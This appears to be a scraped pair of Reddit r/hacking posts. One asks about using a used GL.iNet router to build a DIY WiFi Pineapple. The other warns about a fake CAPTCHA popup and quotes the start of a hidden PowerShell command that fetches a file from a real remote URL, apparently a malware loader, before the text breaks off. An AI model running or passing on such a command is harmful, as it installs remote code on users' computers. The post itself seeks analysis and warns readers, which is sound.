<!-- SC_OFF --><div class="md"><p>Hi. I am making my own WiFi pineapple and I&#39;m using a GL.iNet GL-MT300N-V2 (Mango). I&#39;m getting a used one on Amazon so instead of 30 I&#39;m getting it for 15. Is there any reason why you guys wouldn&#39;t trust this router? </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/mysteriousflu"> /u/mysteriousflu </a> <br/> <span><a href="https://www.reddit.com/r/hacking/comments/1gtqlzk/wifi_pineapple_diy/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/hacking/comments/1gtqlzk/wifi_pineapple_diy/">[comments]</a></span>

## What would this malicious command do if I were to run it on my computer? A popup essentially told me to put it in the run window.

<!-- SC_OFF --><div class="md"><p>Brief warning: This is a sneaky fucking thing that a popup showed me after I clicked to verify as human, it&#39;s clearly extremely dodgy so unless you know what you&#39;re doing please don&#39;t do anything with it because it&#39;s almost certainly malicious and I don&#39;t have any idea what it does or if there are any other ways in which it could cause harm to someone&#39;s computer, which is the purpose of this post.</p> <p>So basically what the website did was after I clicked the captcha it put a command line (below) into my clipboard, and said to verify in 3 steps which were &quot;Hold windows key and press R&quot; (which opens up the windows run window), &quot;Press CTRL+V&quot;, &quot;Press Enter.&quot;</p> <p>This is the command:</p> <p>&quot;cmd.exe /c powershell -WindowStyle Hidden -Command &quot;$rQd=&#39;<a href="https://s3-sos-scw5.b-cdn.net/fadi.txt">https://s3-sos-scw5.b-cdn.net/fadi.txt</a>&#39;; $pLs=New-Object System.Net.WebClient;
